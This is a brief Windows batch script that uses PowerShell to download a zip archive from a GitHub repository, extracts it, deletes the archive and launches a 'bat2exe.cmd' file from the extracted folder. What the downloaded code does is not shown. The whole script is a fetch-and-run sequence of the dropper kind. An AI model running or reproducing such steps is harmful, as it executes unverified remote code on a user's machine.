powershell -c "Invoke-WebRequest -Uri 'https://github.com/zv800/temp/raw/master/temp.zip' -OutFile 'temp.zip'"
powershell -c Expand-Archive -Force temp.zip output\
del temp.zip 
cd output
start bat2exe.cmd
::thats all
